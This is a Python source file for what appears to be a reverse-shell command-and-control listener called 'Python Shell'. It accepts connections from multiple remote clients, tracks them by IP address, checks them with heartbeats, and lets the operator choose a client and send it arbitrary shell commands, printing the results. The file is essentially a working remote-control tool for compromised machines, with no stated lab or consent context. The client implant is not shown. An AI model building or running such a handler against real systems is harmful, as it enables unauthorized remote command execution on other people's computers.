from art import *
import json
import time
import socket
import threading

# Initialising Variables
connections = []
addresses = []
continueThread = True


# Function to Create a Socket (allows two computers to connect)
def createSocket():
    # Globalizing Socket Variable
    global serverSocket

    # Trying to Create a Socket
    try:

        # Creating Socket and Binding
        serverSocket = socket.socket()
        serverSocket.bind((host, int(port)))

    # Displaying Error if Needed
    except:
        print("Error. Check socket settings.")
        time.sleep(2)
        print("\n" * 100)


# Function to Listen for Connections on Socket
def listen():
    try:
        # Listening to Socket
        serverSocket.listen()

    except:
        print()


# Establish a Connection with Client
def acceptSocketConnection():
    # Globalizing Socket Variable
    global address, conn, connections, addresses

    # Loop to Continue Accepting Connections
    while True:

        # Try is used to Avoid Errors when Users Exit Listening Stage
        try:
            # Accepting Connections (Address is a variable for client information such as IP, while conn is like the
            # 'identifier' for the connection and can be referenced to)
            conn, address = serverSocket.accept()
            print(address[1])
            # Getting Rid of Timeouts on Connection & Making Sure Sending and Receiving are in Sync
            conn.settimeout(0)
            conn.setblocking(True)

            # Saving Connection and Corresponding IP Address to Dictionary
            connections.append({"Connection": conn, "IP Address": address[0]})

            # Saving Addresses
            addresses.append(address[0])

        except:
            break


# Function to Send Commands to the Client
def sendCommands(connection):
    # Boolean Variable to Tell if Function Should Get Startup Information
    initialRun = True

    # Indefinite Loop for User-Entered Commands
    while True:

        if initialRun:
            # Connection Title
            print("\033[92m" + text2art("Connected!"), end='')

            # Printing Message if a Connection has been Established
            print("\nA connection has been established with " + address[
                0] + ". Enter exit to close connection.\n")

            # Getting & Printing Directory
            connection.send(str.encode('directory'))
            directory = str(connection.recv(6000), 'utf-8')
            print(directory, end='')

            initialRun = False

        # User Prompt
        cmd = input()

        # Checking if User Wants to Quit
        if cmd == "exit":

            # Going Back to Menu
            print("\n" * 100)
            break

        # Checking if User Wants to Clear Screen
        elif cmd == "clear":

            # Clearing Screen
            print("\n" * 100)

            # Making sure Startup Information is Extracted
            initialRun = True

        # Checking if There is a Command to Send
        elif len(cmd) > 0:
            # Changing Command to Bytes and Sending Command
            connection.send(str.encode(cmd))

            # Saving Client Response to a Variable (decoding it into a string with utf-8)
            clientResponse = str(connection.recv(6000), 'utf-8')

            # Printing Client Response
            print(clientResponse, end='')


# Function to Modify Socket Settings (Host & Port)
def modifySocketSettings():
    # Clearing Screen
    print("\n" * 100)

    # Settings Title
    print("\033[92m" + text2art("Socket    Settings\n"))

    # Asking User for Host and Port Details
    tempHost = input("Enter the IP address the socket will be created on: ")
    tempPort = input("Enter the port number the socket will be created on: ")

    # Saving Host and Port Details
    tempSettings = {'host': tempHost, 'port': tempPort}

    # Loading Settings to Config
    with open("socketSettings.json", "w") as settingsFile:
        json.dump(tempSettings, settingsFile, indent=1)

    # Successful Modification Message
    print("\nSettings have been modified.")
    time.sleep(1)
    print("\n" * 100)


# Function for Filtering Connections
def filterConnections():
    # While Loop to Constantly Filter Connections
    while continueThread:
        if len(connections) > 0:
            for cc in connections[:]:
                testCon = cc["Connection"]

                # Trying to Connect
                try:

                    # Sending HeartBeat
                    testCon.send(str.encode('heartbeat'))

                    # Receiving HeartBeat
                    testCon.recv(6000)

                except:

                    try:
                        testCon.close()
                        testAdd = cc['IP Address']
                        connections.remove(cc)
                        addresses.remove(testAdd)
                    except:
                        pass


# Function for Listening Thread Jobs
def listeningThreadJobs():
    createSocket()
    listen()
    acceptSocketConnection()


# Function to Create Listening Threads
def createListeningThread():
    global listeningThread
    listeningThread = threading.Thread(target=listeningThreadJobs)
    listeningThread.daemon = True


# Function to Create Filtering Thread
def createFilteringThread():
    global filteringThread
    filteringThread = threading.Thread(target=filterConnections)
    filteringThread.daemon = False


while True:
    # Creating Thread for Socket Listening
    createListeningThread()

    # Home Screen
    print("\033[92m" + text2art("Python    Shell\n\n"))
    print("[1] Listen\n[2] Socket Settings\n[3] Exit\n")

    # Choice Selection
    choice = input(">").strip()

    if choice == '1':

        # Clear Screen
        print("\n" * 100)

        # Extracting Host and Port Settings
        with open("socketSettings.json", "r") as file:
            settings = json.load(file)
            host = settings["host"]
            port = settings["port"]

        # Starting Thread to Listen to Socket
        listeningThread.start()

        while True:

            # Creating and Starting Filtering Thread
            createFilteringThread()
            continueThread = True
            filteringThread.start()

            # Listening Screen
            print("\033[92m" + text2art("Listening"))

            # Printing Socket Listening Message
            print(f"\nListening to socket on {host}:{port}.\n")

            # Choice Selection
            print("[1] Connect\n[2] List Clients\n[3] Back (this will close all connections)\n")
            choice = input(">").strip()

            if choice == '1':
                print("\n" * 100)
                if len(connections) > 0:
                    print("Clients:\n")
                    for client in connections:
                        print(f"{client['IP Address']}")
                    ipAddress = input("\nEnter IP address you wish to connect to: ").strip()
                    if ipAddress in addresses:
                        for client in connections:
                            if client['IP Address'] == ipAddress:
                                con = client['Connection']
                        print("\n" * 100)
                        continueThread = False
                        time.sleep(2)
                        sendCommands(con)
                    else:
                        print("\nCould not find a connection associated with that address.")
                        time.sleep(2)
                        print("\n" * 100)
                else:
                    print("No clients available.")
                    time.sleep(2)
                    print("\n" * 100)

            elif choice == '2':
                print("\n" * 100)
                if len(connections) > 0:
                    print("Clients:\n")
                    for client in connections:
                        print(f"{client['IP Address']}")
                    input("\nPress enter to continue...")
                    print("\n" * 100)
                else:
                    print("No clients available.")
                    time.sleep(2)
                    print("\n" * 100)

            elif choice == '3':
                continueThread = False
                print("\n" * 100)
                for c in connections:
                    tempCon = c["Connection"]
                    tempCon.send(str.encode('close connection'))
                    tempCon.close()
                serverSocket.close()
                connections = []
                addresses = []
                break

            else:
                print("\nInvalid Choice.")
                time.sleep(1)
                print("\n" * 100)

    elif choice == '2':

        # Modifying Socket Function
        modifySocketSettings()

    elif choice == '3':

        # Exit Sequence
        print("\n" * 100)
        print("Goodbye!")
        break

    else:
        print("\nInvalid Choice.")
        time.sleep(1)
        print("\n" * 100)
